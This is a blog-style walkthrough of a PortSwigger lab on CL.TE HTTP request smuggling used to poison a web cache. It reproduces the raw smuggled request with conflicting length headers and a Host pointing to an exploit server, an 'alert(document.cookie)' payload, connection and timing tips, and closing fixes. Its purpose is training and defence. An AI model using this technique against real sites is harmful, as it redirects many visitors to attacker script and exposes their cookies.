---
layout: post
title: "PortSwigger: Exploiting HTTP request smuggling to perform web cache poisoning"
date: 2027-12-16 09:00:00 -0500
categories: [PortSwigger, WebSecurityAcademy, RequestSmuggling]
tags: [portswigger, request-smuggling, web-cache-poisoning, cl-te, desync, host-header, redirect, xss, cwe-444]
---

Two servers stand between the user and this app: a caching front-end proxy and a back-end that actually renders pages. They speak HTTP/1.1 to each other, and they *disagree* about how long a request body is. That disagreement ([CWE-444](https://cwe.mitre.org/data/definitions/444.html)) lets me hide a second request inside the first, and I use it to plant a malicious redirect in the cache that gets served to every visitor.

## Overview

The desync here is a **CL.TE** (Content-Length / Transfer-Encoding):

- The **front-end** measures the body with the `Content-Length` header.
- The **back-end** measures it with `Transfer-Encoding: chunked`.

When a request carries *both* headers, the front-end forwards a chunk of bytes that the back-end reads as **two** requests — the one it was told about, plus a hidden "smuggled" request I buried in the body. That smuggled request becomes the prefix of whatever request arrives next on the connection.

Two more facts turn this into cache poisoning:

1. `GET /post/next?postId=N` replies with a **302 redirect** whose `Location` is built straight from the request's **Host header**. Change the Host, change where the redirect points.
2. `/resources/js/tracking.js` is a **cacheable** static file (`Cache-Control: max-age=30`, with an `X-Cache: miss`/`hit` header showing when it came from cache).

## Why it works

I smuggle a complete `GET /post/next?postId=3` whose Host is **my exploit server**. When the next visitor's browser asks for `tracking.js`, the back-end answers *my* smuggled request first, producing a `302 -> https://my-exploit-server/post`. The front-end pairs that redirect with the victim's `tracking.js` request and **caches it under the tracking.js URL**.

Now every visitor who loads `tracking.js` is redirected to my server, where I host `alert(document.cookie)` — and their browser runs it.

The smuggled request is given its own `Content-Length: 10` with just a 3-byte body (`x=1`). Those 7 missing bytes get eaten from the start of the victim's request line, so the back-end answers the smuggled `/post/next` cleanly instead of choking on the leftovers.

## The attack

**1. Host the payload** on the exploit server at `/post` (the redirect target):

```
Content-Type: application/javascript; charset=utf-8

alert(document.cookie)
```

**2. Send the poisoning request.** curl can't help here — it strips conflicting `Content-Length` + `Transfer-Encoding` headers, and if the TLS handshake negotiates HTTP/2 the length ambiguity vanishes. So it's a raw TLS socket with `http/1.1` ALPN forced:

```
POST / HTTP/1.1
Host: LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 143
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: EXPLOIT-ID.exploit-server.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```

**3. On a second connection, send a normal request** so the smuggled prefix attaches to it:

```
GET /resources/js/tracking.js HTTP/1.1
Host: LAB-ID.web-security-academy.net
Connection: close
```

That request comes back as `302 Found`, `Location: https://EXPLOIT-ID.exploit-server.net/post?postId=4`, `X-Cache: miss` — the poisoned redirect was just stored.

**4. Confirm the whole cache is poisoned:**

```
$ curl -sk https://LAB-ID.web-security-academy.net/resources/js/tracking.js -D -
HTTP/2 302
location: https://EXPLOIT-ID.exploit-server.net/post?postId=4
x-cache: hit
```

`X-Cache: hit` on a plain request means the cache is serving my redirect to everyone. The lab bot loads `tracking.js`, follows the redirect, runs `alert(document.cookie)`, and the lab is **Solved**.

## Gotchas

- **Force `http/1.1` ALPN.** Over HTTP/2 the protocol frames the body length itself and there's no CL/TE ambiguity — the desync silently fails.
- **Share a back-end connection.** The poisoning POST and the victim `tracking.js` GET have to travel down the same back-end socket. Send them back-to-back; a slow, single-connection attempt just cached the clean 200.
- **Watch the 30s TTL.** If `tracking.js` was already cached before you poisoned, wait for the entry to expire, or you'll keep getting hits of the clean file.

## The fix

- **Don't build a redirect `Location` from the client Host header.** Use a server-pinned canonical origin.
- **Kill the desync.** Use one normalized HTTP parser front-to-back and reject any request carrying both `Content-Length` and `Transfer-Encoding`; better still, speak HTTP/2 end-to-end so length is never ambiguous.
- **Don't cache responses derived from ambiguous or smuggled requests**, and never store a response carrying `Set-Cookie` or per-user content under a shared static-asset key.
